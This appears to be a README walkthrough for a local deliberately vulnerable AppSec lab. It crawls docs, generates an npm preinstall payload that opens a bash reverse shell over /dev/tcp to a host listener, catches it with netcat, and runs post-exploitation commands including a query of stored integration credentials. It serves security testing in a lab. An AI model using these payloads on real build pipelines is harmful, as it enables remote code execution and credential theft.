# Build Canaries DVAP Demo

This demo is for the local DVAP lab stack. It starts with documentation crawling,
generates a Build Canaries RCE payload, sends a reverse shell to your local
listener on port `13377`, and populates the local instance with DVAP sample
findings.

## 1. Start DVAP with host callback routing

```sh
cd /home/r/damn-vulnerable-appsec-platform
docker compose -f docker-compose.yml -f docker-compose.canary-demo.yml up --build -d

export API_URL=http://127.0.0.1:8000
export DOCS_URL=http://127.0.0.1:8080/docs-crawl.html
until curl -fsS "$API_URL/api/healthz" >/dev/null; do sleep 2; done
```

If your user cannot access `/var/run/docker.sock`, run the `docker compose`
command with the local Docker access method you normally use, for example `sudo`.

## 2. Crawl the docs

Full Build Canaries discovery uses OpenAI model calls:

```sh
cd /home/r/damn-vulnerable-appsec-platform
. .venv/bin/activate

export DOCS_URL=http://127.0.0.1:8080/docs-crawl.html
export OPENAI_API_KEY=YOUR_KEY_HERE
canary discover --url "$DOCS_URL" --depth 0 --dry-run
```

Crawler-only smoke test, no OpenAI key required:

```sh
cd /home/r/damn-vulnerable-appsec-platform
. .venv/bin/activate

export DOCS_URL=http://127.0.0.1:8080/docs-crawl.html
python - <<'PY'
from build_canary.discover import fetch_docs
import os

docs = fetch_docs(os.environ["DOCS_URL"], max_depth=0, max_concurrent=1)
print(f"crawled_documents={len(docs)}")
for url, markdown in docs:
    print(url)
    print(markdown[:500])
PY
```

## 3. Generate the RCE reverse-shell payload

The payload executes inside the Docker worker. `host.docker.internal` resolves to
your host via `docker-compose.canary-demo.yml`, so it lands on your local port
`13377`.

```sh
cd /home/r/damn-vulnerable-appsec-platform
. .venv/bin/activate

export RHOST=host.docker.internal
export RPORT=13377
rm -rf /tmp/dvap-build-canary-rce /tmp/dvap-build-canary-rce.tgz

canary generate \
  --id npm-preinstall \
  --beacon demo.invalid \
  --run-id dvap-rce \
  --command "bash -c 'bash -i >& /dev/tcp/${RHOST}/${RPORT} 0>&1' || true" \
  --output /tmp/dvap-build-canary-rce

tar -C /tmp/dvap-build-canary-rce -czf /tmp/dvap-build-canary-rce.tgz .
```

## 4. Catch the reverse shell

Run this in terminal 1:

```sh
nc -lvnp 13377
```

Run this in terminal 2:

```sh
cd /home/r/damn-vulnerable-appsec-platform
export API_URL=http://127.0.0.1:8000

curl -fsS -X POST "$API_URL/api/config/preset/vulnerable" | python3 -m json.tool

curl -fsS -X POST "$API_URL/api/scans/upload" \
  -F 'meta={"module":"sca","vector":"npm_lifecycle","source_type":"upload"}' \
  -F "archive=@/tmp/dvap-build-canary-rce.tgz;type=application/gzip" \
  | tee /tmp/dvap-rce-scan.json \
  | python3 -m json.tool
```

The upload request stays open while the shell is active. In terminal 1, run a
quick proof and exit so the scan can finish:

```sh
id
hostname
ps aux
ip route
psql "$LATERAL_MOVEMENT_DB_URL" -c "SELECT service, credential_type, owner FROM integration_credentials ORDER BY service, credential_type;"
exit
```

## 5. Populate the local instance with real DVAP vulnerable findings

These use the checked-in vulnerable sample repos and real analyzer toolchains.

```sh
cd /home/r/damn-vulnerable-appsec-platform
export API_URL=http://127.0.0.1:8000

curl -fsS -X POST "$API_URL/api/config/preset/vulnerable" | python3 -m json.tool

curl -fsS -X POST "$API_URL/api/scans" \
  -H 'Content-Type: application/json' \
  -d '{"module":"iac","source_type":"sample"}' | python3 -m json.tool

curl -fsS -X POST "$API_URL/api/scans" \
  -H 'Content-Type: application/json' \
  -d '{"module":"sca","source_type":"sample"}' | python3 -m json.tool

curl -fsS -X POST "$API_URL/api/scans" \
  -H 'Content-Type: application/json' \
  -d '{"module":"sast","source_type":"sample"}' | python3 -m json.tool

curl -fsS -X POST "$API_URL/api/scans" \
  -H 'Content-Type: application/json' \
  -d '{"module":"secrets","source_type":"sample"}' | python3 -m json.tool
```

## 6. Count findings and seeded local vulnerability data

The UI findings table is derived from `scans.data->'analyzers'`, not stored in a
separate `vulnerabilities` table.

```sh
cd /home/r/damn-vulnerable-appsec-platform

docker compose -f docker-compose.yml -f docker-compose.canary-demo.yml exec -T postgres psql -U dvap_app -d dvap -c "
SELECT count(*) AS generated_findings
FROM scans s
CROSS JOIN LATERAL jsonb_array_elements(s.data->'analyzers') AS a;
"
```

Open findings:

```sh
cd /home/r/damn-vulnerable-appsec-platform

docker compose -f docker-compose.yml -f docker-compose.canary-demo.yml exec -T postgres psql -U dvap_app -d dvap -c "
SELECT count(*) AS open_findings
FROM scans s
CROSS JOIN LATERAL jsonb_array_elements(s.data->'analyzers') AS a
WHERE COALESCE((a->>'triggered')::boolean, false)
  AND a->>'status' = 'ok';
"
```

Verify local seeded canary credentials:

```sh
cd /home/r/damn-vulnerable-appsec-platform

docker compose -f docker-compose.yml -f docker-compose.canary-demo.yml exec -T postgres psql -U dvap_app -d dvap -c "
SELECT service, credential_type, owner
FROM integration_credentials
ORDER BY service, credential_type;
"
```
